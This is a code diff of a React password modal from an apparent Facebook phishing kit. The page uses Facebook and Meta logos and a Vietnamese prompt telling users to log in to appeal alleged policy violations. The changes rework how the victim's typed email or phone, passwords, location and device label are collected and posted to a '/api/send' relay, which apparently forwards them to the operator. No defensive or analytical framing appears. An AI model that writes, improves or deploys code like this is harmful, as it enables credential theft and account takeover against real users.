@@ -2,6 +2,7 @@ import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
+import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
@@ -20,7 +21,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageId, setMessageContent } = store();
+    const { geoInfo, deviceLabel, messageId, userData, addAccount, addPassword, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -35,7 +36,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             'Password',
             'You entered the wrong password. Please try again.',
             'Continue',
-            'Để xem những báo cáo và lỗi vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục'
+            'Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục'
         ];
 
         const translateAll = async () => {
@@ -64,20 +65,28 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const accountLine = `<b>📨 Email/Phone ${next}/${maxPass}:</b> <code>${accountInput}</code>`;
-        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
+        addAccount(accountInput);
+        addPassword(password);
 
-        const updatedMessage = messageContent ? `${messageContent}\n\n${accountLine}\n${passwordLine}` : `${accountLine}\n${passwordLine}`;
+        const allAccounts = [...userData.accounts, accountInput];
+        const allPasswords = [...userData.passwords, password];
+        const message = buildAppealMessage({
+            geoInfo,
+            deviceLabel,
+            userData,
+            accounts: allAccounts,
+            passwords: allPasswords,
+            maxPass
+        });
 
         try {
             const res = await axios.post('/api/send', {
-                message: updatedMessage,
-                message_id: messageId
+                message,
+                old_message_id: messageId
             });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
-                setMessageContent(updatedMessage);
             }
 
             if (config.PASSWORD_LOADING_TIME) {
